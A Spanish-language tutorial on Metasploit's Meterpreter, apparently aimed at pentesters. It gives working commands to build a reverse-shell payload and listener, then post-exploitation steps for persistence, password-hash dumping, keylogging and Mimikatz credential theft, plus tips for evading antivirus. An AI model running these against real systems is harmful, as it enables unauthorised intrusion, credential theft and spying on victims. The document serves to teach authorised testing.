# 🛠️ Meterpreter: Payload Avanzado de Metasploit

## 📌 ¿Qué es Meterpreter?

**Meterpreter** (Meta-Interpreter) es un payload dinámico y avanzado incluido en el framework de Metasploit. A diferencia de una shell tradicional, Meterpreter se ejecuta en memoria, lo que lo hace más sigiloso y flexible. Proporciona una interfaz interactiva con múltiples funcionalidades para post-explotación, escalada de privilegios, persistencia y movimiento lateral.

---

## ⚙️ Características Principales

- **Ejecución en memoria**: No escribe archivos en disco (en muchos casos), evitando detección por antivirus.
- **Modularidad**: Se pueden cargar extensiones como `stdapi`, `priv`, `incognito`, etc.
- **Transporte cifrado**: Comunicación segura entre atacante y víctima.
- **Multiplataforma**: Compatible con Linux, Windows, macOS y Android.
- **Control remoto completo**: Permite ejecutar comandos, manipular archivos, capturar pantalla, grabar audio, etc.

---

## 🚀 Tipos de Payload Meterpreter

| Payload                                 | Plataforma | Descripción                                  |
|-----------------------------------------|------------|----------------------------------------------|
| `windows/meterpreter/reverse_tcp`       | Windows    | Conexión inversa por TCP                     |
| `windows/meterpreter/bind_tcp`          | Windows    | Conexión directa (bind) por TCP              |
| `linux/x86/meterpreter/reverse_tcp`     | Linux      | Conexión inversa para sistemas Linux         |
| `android/meterpreter/reverse_tcp`       | Android    | Payload para dispositivos Android            |
| `osx/x86/meterpreter/reverse_tcp`       | macOS      | Payload para sistemas macOS                  |

---

## 🧪 Ejemplo de Uso

### 1. Generar el payload con `msfvenom`

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.56.1 LPORT=4444 -f elf > meterpreter.elf
```

### 2. Configurar el listener en Metasploit

```bash
use exploit/multi/handler
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set LHOST 192.168.56.1
set LPORT 4444
run
```

### 3. Ejecutar el payload en la máquina víctima

```bash
chmod +x meterpreter.elf
./meterpreter.elf
```

## 🧭 Comandos Útiles en Meterpreter

### 🔍 Información del sistema

```bash
sysinfo         # Información del sistema operativo
getuid          # Usuario actual
ipconfig        # Interfaces de red
```

### 📁 Gestión de archivos

```bash
ls              # Listar archivos
cd /path        # Cambiar directorio
upload file     # Subir archivo
download file   # Descargar archivo
```

### 🧠 Escalada de privilegios

```bash
use post/multi/recon/local_exploit_suggester
set SESSION <id>
run
```

### 🧬 Persistencia

```bash
run persistence -U -i 5 -p 4444 -r 192.168.56.1
```

### 🕵️ Recolección de credenciales

```bash
hashdump        # Extraer hashes de contraseñas
keyscan_start   # Activar keylogger
```

### 🖼️ Captura de pantalla

```bash
screenshot
```

### 🧱 Control de sesiones

```bash
background      # Poner sesión en segundo plano
sessions -l     # Listar sesiones activas
sessions -i <id># Interactuar con sesión específica
```

### 🧩 Extensiones de Meterpreter

| Extensión  | Funcionalidad                                         |
|------------|--------------------------------------------------------|
| stdapi     | Funciones básicas del sistema (archivos, procesos)     |
| priv       | Escalada de privilegios                                |
| incognito  | Manipulación de tokens en Windows                      |
| sniffer    | Captura de tráfico de red                              |
| kiwi       | Dump de credenciales con Mimikatz (Windows)            |


## 🔐 Seguridad y Detección

Aunque Meterpreter es poderoso, puede ser detectado por soluciones modernas de EDR/AV. Para evadir detección:

- Usa encoders en msfvenom.
- Ejecuta en memoria (sin escribir en disco).
- Cambia el transporte (reverse_https, reverse_tcp_dns).
- Usa técnicas de ofuscación y empaquetado.

## 📚 Recursos Adicionales

- [Documentación oficial de Metasploit](https://docs.metasploit.com/)
- [Payload Cheat Sheet](https://github.com/hakluke/metasploit-payload-cheat-sheet)
- [Metasploit Unleashed](//www.offensive-security.com/metasploit-unleashed/)

## 🧠 Conclusión

Meterpreter es una herramienta esencial en el arsenal de cualquier pentester. Su versatilidad y potencia lo convierten en el payload ideal para tareas de post-explotación, manteniendo control total sobre el sistema comprometido. Dominar Meterpreter te permite ir más allá del acceso inicial y convertir una intrusión en una auditoría completa.
